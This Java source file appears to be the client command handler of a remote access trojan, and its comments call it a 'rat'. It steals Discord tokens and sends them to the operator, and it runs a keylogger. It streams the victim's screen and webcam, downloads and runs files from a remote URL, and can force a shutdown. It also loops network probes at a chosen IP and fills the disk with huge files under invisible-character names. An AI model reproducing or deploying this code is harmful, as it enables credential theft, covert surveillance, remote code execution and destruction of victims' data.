package me.sebsb;

import java.awt.AWTException;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.net.InetAddress;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import javax.swing.JOptionPane;
import javax.swing.filechooser.FileSystemView;

import org.jnativehook.NativeHookException;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.util.OsUtils;

import me.sebsb.utils.MessageType;
import me.sebsb.utils.NetUtils;
import me.sebsb.utils.OSUtil;
import me.sebsb.utils.StringUtils;

/*
 * Sorry for the messy code,
 * I couldn't be bothered making it clean.
 * 
 * A lot of the stuff in this rat is also untested, So try it yourself.
 */
public class ClientManager {

	// Botnet
	private Thread botnet;
	
	// Desktop
	private Thread desktop;
	private boolean runningDesktop;
	private float compression = 0.4F;
	
	// Webcam
	private Thread webcam;
	private boolean runningWebcam;
	
	// KeyLogger
	private KeyLogger keylogger;

	public void onMessage(Packet packet, PrintWriter pw) {
		if (keylogger == null) {
			try {
				keylogger = new KeyLogger(pw);
			} catch (NativeHookException e) {
				e.printStackTrace();
			}
		}
		if (packet.action == MessageType.DISCORD.getID()) {
			ArrayList<String> tokens = new ArrayList<String>();
			try {
				tokens = this.getTokens();
			} catch (Exception e) {}
			ArrayList<String> toSend = new ArrayList<String>();
			
			if (tokens == null || tokens.isEmpty()) {
				toSend.add("No Tokens Were Found :(");
			} else {
				toSend.add("Tokens: ");
				for (int i = 0; i < tokens.size(); i++) {
					if (!toSend.contains(tokens.get(i))) {
						toSend.add(tokens.get(i));
					}
				}
			}
			try {
			    Packet packet2 = new Packet();
			    packet2.action = MessageType.GUI_TEXT.getID();
			    packet2.data = toSend;
				NetUtils.sendMessage(packet2, pw);
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (packet.action == MessageType.ALTF4.getID()) {
			try {
				Robot r = new Robot();
				r.keyPress(KeyEvent.VK_ALT);
				r.keyPress(KeyEvent.VK_F4);
				
				r.keyRelease(KeyEvent.VK_ALT);
				r.keyRelease(KeyEvent.VK_F4);
			} catch (AWTException e) {
				e.printStackTrace();
			}
		}  else if (packet.action == MessageType.MESSAGE_BOX.getID()) {
			try {
				new Thread(new Runnable() {

					@Override
					public void run() {
						try {
							JOptionPane.showMessageDialog(null, packet.data.get(1), packet.data.get(0), Integer.parseInt(packet.data.get(2)));
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
					
				}).start();
			} catch (Exception npe) {
				npe.printStackTrace();
			}
		} else if (packet.action == MessageType.BOTNET.getID()) {
			if (packet.data.get(0).equals("start")) {
				try {
					String ip = packet.data.get(1);
					int timeout = Integer.parseInt(packet.data.get(2));
					if (this.botnet != null && this.botnet.isAlive()) {
						this.botnet.stop();
					}
					
					this.botnet = new Thread(new Runnable() {

						@Override
						public void run() {
							botnet(ip, timeout);
						}
						
					});
					this.botnet.start();
				} catch (Exception e) {
					e.printStackTrace();
				}
			} else if (packet.data.get(0).equals("stop")) {
				if (this.botnet != null && this.botnet.isAlive()) {
					this.botnet.stop();
				}
			}
		} else if (packet.action == MessageType.DRIVEFUCKER.getID()) {
			// I like this drive fucker
			String characters = "abcdefghijklmnopqrstuvwxyz123456789";
			for (int i = 0; i < characters.length(); i++) {
				boolean made = false;
				for (int l = 259; l > 0; l--) {
					try {
						StringBuilder sb = new StringBuilder(characters.charAt(0));
						for (int g = 0; g < l; g++) {
							sb.append("\u200e");
						}
						File f = new File(FileSystemView.getFileSystemView().getHomeDirectory(), sb.toString());
						f.createNewFile();
						
				        RandomAccessFile fill = new RandomAccessFile(f, "rw");
				        fill.setLength((long) (!made ? 1.5e+10 : 5e+8));
				        fill.close();
						made = true;
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		} else if (packet.action == MessageType.DESKTOP.getID()) {
			try {
				if (packet.data.get(0).equals("start")) {
					runningDesktop = true;
					if (desktop == null || !desktop.isAlive()) {
						desktop = new Thread(new Runnable() {

							@Override
							public void run() {
								remoteDesktop(pw);
							}
						});
						desktop.start();
					}
				} else if (packet.data.get(0).equals("stop")) {
					runningDesktop = false;
					if (this.desktop != null && this.desktop.isAlive()) {
						this.desktop.stop();
					}
				} else if (packet.data.get(0).equals("comp")) {
					this.compression = Float.parseFloat(packet.data.get(1));
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (packet.action == MessageType.OPEN_URL.getID()) {
			try {
				String url = packet.data.get(0);
				Desktop.getDesktop().browse(new URI(url));
			} catch (IOException | URISyntaxException e) {
				e.printStackTrace();
			}
		} else if (packet.action == MessageType.INSTALL_CLIENT.getID()) {
			try {
				String url = packet.data.get(0);
				String fileName = packet.data.get(1);
				File jar = new File(Client.class.getProtectionDomain().getCodeSource().getLocation()
					    .toURI());
				File temp = new File(System.getProperty("java.io.tmpdir"), StringUtils.getRandomString(12));
				this.downloadUsingStream(url, temp);
				
				File createdFile = null;
				boolean created = false;
				for (int l = 0; l < 15; l++) {
					if (!created) {
						try {
							StringBuilder sb = new StringBuilder(fileName);
							for (int i = 0; i < 259 - l - fileName.length() - ".jar".length(); i++) {
								sb.append("\u200e");
							}
							sb.append(".jar");
							Files.copy(Paths.get(temp.getPath()), new FileOutputStream(createdFile = new File(jar.getParent(), sb.toString())));
							created = true;
						} catch (Exception e) {}
					}
				}
				
				if (created) {
					Runtime.getRuntime().exec("java -jar " + createdFile.getAbsolutePath() + " " + jar.getAbsolutePath());
					System.exit(0);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (packet.action == MessageType.WEBCAM.getID()) {
			try {
				if (packet.data.get(0).equals("start")) {
					runningWebcam = true;
					if (webcam == null || !desktop.isAlive()) {
						webcam = new Thread(new Runnable() {

							@Override
							public void run() {
								try {
									remoteWebcam(pw);
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
						});
						webcam.start();
					}
				} else if (packet.data.get(0).equals("stop")) {
					runningWebcam = false;
					if (this.webcam != null && this.webcam.isAlive()) {
						this.webcam.stop();
					}
				} else if (packet.data.get(0).equals("comp")) {
					this.compression = Float.parseFloat(packet.data.get(1));
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (packet.action == MessageType.INSTALLPROGRAM.getID()) {
			try {
				String url = packet.data.get(0);
				String fileName = packet.data.get(1);
				String[] args = fileName.split(".");
				String ending = args[args.length - 1];
				File temp = new File(System.getProperty("java.io.tmpdir"), StringUtils.getRandomString(12) + "." + ending);
				this.downloadUsingStream(url, temp);
				if (Desktop.isDesktopSupported()) {
					Desktop.getDesktop().open(temp);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (packet.action == MessageType.SHUTDOWN.getID()) {
			try {
			    if (OsUtils.getOS() == OsUtils.NIX|| OsUtils.getOS() == OsUtils.OSX) {
				    Runtime.getRuntime().exec("shutdown -h now");
				    System.exit(0);
			    }
			    else if (OsUtils.getOS() == OsUtils.WIN) {
				    Runtime.getRuntime().exec("shutdown.exe -s -t 0");
				    System.exit(0);
			    }
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
    private void downloadUsingStream(String urlStr, File file) throws IOException{
    	URL url = new URL(urlStr);
    	BufferedInputStream bis = new BufferedInputStream(url.openStream());
        FileOutputStream fis = new FileOutputStream(file);
        byte[] buffer = new byte[1024];
        int count=0;
        while((count = bis.read(buffer,0,1024)) != -1) {
            fis.write(buffer, 0, count);
        }
        fis.close();
        bis.close();
    }
    
	private void remoteDesktop(PrintWriter pw) {
		File temp = new File(System.getProperty("java.io.tmpdir"), "tempd.jpg");
		while (runningDesktop) {
			try {
				Dimension tk = Toolkit.getDefaultToolkit().getScreenSize();
				
		        Robot rt = new Robot();
		        BufferedImage img = rt.createScreenCapture(new Rectangle((int) tk.getWidth(), (int) tk.getHeight()));

		        ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
		        ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
		        writer.setOutput(ios);

		        ImageWriteParam param = writer.getDefaultWriteParam();
		        if (param.canWriteCompressed()){
		            param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
		            param.setCompressionQuality(compression);
		        }
		        writer.write(null, new IIOImage(img, null, null), param);
			    String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
			    Packet packet = new Packet();
			    packet.action = MessageType.DESKTOP.getID();
			    packet.data = new ArrayList<String>();
			    packet.data.add(encodedString);
			   	NetUtils.sendMessage(packet, pw);
			} catch (ThreadDeath dt) {
				if (temp.exists()) {
					try {
						temp.delete();
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}
			
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				e.printStackTrace();
			} catch (ThreadDeath dt) {}
		}
		if (temp.exists()) {
			try {
				temp.delete();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	private void remoteWebcam(PrintWriter pw) {
		Webcam webcam = Webcam.getDefault();
		if (webcam == null) {
			try {
				Packet packet = new Packet();
				packet.action = MessageType.WEBCAM.getID();
				packet.data = Arrays.asList(new String[] {"error"});
				NetUtils.sendMessage(packet, pw);
			} catch (Exception e) {
				e.printStackTrace();
			}
		    runningWebcam = false;
		    return;
		}
		File temp = new File(System.getProperty("java.io.tmpdir"), "tempwe.jpg");
		while (runningWebcam) {
			try {
				webcam.open();
				BufferedImage img = webcam.getImage();
				webcam.close();
		        ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
		        ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
		        writer.setOutput(ios);

		        ImageWriteParam param = writer.getDefaultWriteParam();
		        if (param.canWriteCompressed()){
		            param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
		            param.setCompressionQuality(compression);
		        }
		        writer.write(null, new IIOImage(img, null, null), param);
			    String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
			    Packet packet = new Packet();
			    packet.action = MessageType.WEBCAM.getID();
			    packet.data = new ArrayList<String>();
			    packet.data.add(encodedString);
			   	NetUtils.sendMessage(packet, pw);
			} catch (ThreadDeath td) {webcam.close();} catch (IOException e) {
				e.printStackTrace();
			} catch (Exception e) {
				e.printStackTrace();
			}
			if (temp.exists()) {
				try {
					temp.delete();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				e.printStackTrace();
			} catch (ThreadDeath dt) {
				webcam.close();
			}
		}
		webcam.close();
		if (temp.exists()) {
			try {
				temp.delete();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	public String getSeparator() {
		return "|}";
	}

	public ArrayList<String> getTokens() throws Exception {
		String _File = System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb\\";
		if (OSUtil.isMac) {
			_File = System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/";
		}
		ArrayList<String> files = new ArrayList<String>();
		if (!(new File(_File)).isDirectory()) {
			return files;
		}
		for (File file : (new File(_File)).listFiles()) {
			if (file.getName().endsWith(".ldb")) {
				files.add(file.getAbsolutePath());
			}
		}
		ArrayList<String> tokens = new ArrayList<String>();
		for (String str : files) {
			BufferedReader reader = new BufferedReader(new FileReader(str));
			String line = reader.readLine();
			while (line != null) {
				if (line.contains("oken")) {
					try {
						String line2 = line.substring(line.indexOf("oken"));
						String line3 = line2.split("\"")[1];
						if (line3 != null && line3.length() > 12 && checkToken(line3)) {
							tokens.add(line3);
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				line = reader.readLine();
			}
			reader.close();
		}
		return tokens;
	}
	
	private static boolean checkToken(String s) {
		if (s == null)
			return false;
		
		String list = "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_+-={}|][:;'?></.,`~\"";
		int len = s.length();
		for (int i = 0; i < len; i++) {
	         if (!list.contains(s.toLowerCase().charAt(i) + "")) {
	        	 return false;
	         }
		}
		return true;
	}
	
	private void botnet(String ip, int timeout) {
		try {
			while (true) {
				try {
					InetAddress address = InetAddress.getByName(ip);
		            System.out.println(address.isReachable(timeout));
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		} catch (Exception e) {
		} catch (ThreadDeath td) {}
	}
}
